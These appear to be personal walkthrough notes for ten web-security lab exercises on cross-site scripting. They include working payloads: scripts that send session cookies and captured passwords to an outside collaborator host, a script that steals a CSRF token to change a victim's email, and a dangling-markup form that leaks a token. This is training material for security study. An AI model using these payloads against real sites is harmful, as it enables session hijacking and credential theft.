Reflected XSS:- It arises when an application receives data in an HTTP request 
                and includes that data within the immediate response in an unsafe way.

#1 Lab: Reflected XSS into HTML context with nothing encoded.

       Use basic xss payloads like <script>alert(1)</script> in search box.

-----------------------------------------------------------------------------------------

TIP:-         Test every entry point.
              Submit random alphanumeric values

#2 Lab: Stored XSS into HTML context with nothing encoded

       1.basic payloads like <script>alert(1)</script> in comment section

-----------------------------------------------------------------------------------------

#3 Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded 
        and single quotes and backslash escaped

      1. https://foobar.com/?&#39;+alert()+&#39;
       it's separating ' everywhere with backslash and encoding < and > with html entities
      2. So we're encoding the < ' and > in html encoding and escaping ' with backslash and lab is solved.

-----------------------------------------------------------------------------------------

#4 Lab: Exploiting cross-site scripting to steal cookies

     1. In comment section of any post enter the payload given below
     <script>fetch('https://burpcollaborator-link/?cookie='+document.cookie);</script>
     2. See the response in collaborator and gather cookie from there
     3. Enter the sessioncookie in current session and lab is solved.

-----------------------------------------------------------------------------------------

#5 Lab: Exploiting cross-site scripting to capture passwords

     1. In comment section of any post enter the payload given below
     <input name=username id=username>
     <input type=password name=password onchange='if(this.value.length)
     fetch('https://collaboratr-url?username="+username.value+"&password="+this.value)'>
     2. See the response in collaborator and gather password from there
     3. Enter the password in current session and lab is solved

------------------------------------------------------------------------------------------

#6 Lab: Exploiting XSS to bypass CSRF defenses

     1. Change email and send to repeater
     2. Go to comment section of any post and enter the payload given below
       <script>
       var req = new XMLHttpRequest();
       req.onload = handleResponse;
       req.open('get','/my-account',true);
       req.send();
       function handleResponse() {
           var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
           var changeReq = new XMLHttpRequest();
           changeReq.open('post', '/my-account/change-email', true);
           changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

-------------------------------------------------------------------------------------------

#7 Lab: Reflected XSS with AngularJS sandbox escape without strings

     1. try to break the sandbox with payload given in lab

-------------------------------------------------------------------------------------------

#8 Lab: Reflected XSS with AngularJS sandbox escape and CSP

     1. Refer the cheatsheet below to bypass CSP 
      https://portswigger.net/web-security/cross-site-scripting/cheat-sheet


-------------------------------------------------------------------------------------------

#9 Lab: Reflected XSS in a JavaScript URL with some characters blocked

     1. Used arrow to implement throw statement then used the payload given in lab

--------------------------------------------------------------------------------------------

#10 Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

     1. In url add &email=<script>alert(1)</script> 
     2. Inspect the page and we'll see that payload is reflected without any sanitation
     3. Make value=""><form> instead of keeping script tag in it
     4. Paste the payload given below in url 
         "></form><form class="login-form" name="evil-form" action="https://8bkyukl51qzexso3v2k54v9s7jda11pq.oastify.com/token" method="GET"><button class="button" type="submit">Click Me</button></form>
     5.Change email manually and capture the request in burp and in url remove id=wiener
     6. Send the payload in point 4 to exploit server under script tag
     7. Once you receive the csrf token of target then in repeater generate csrf poc and send to exploit server
     8. In exploit server change csrf token to with victim's and email to given in lab question and lab is solved.

----------------------------------------------------------------------------------------------------------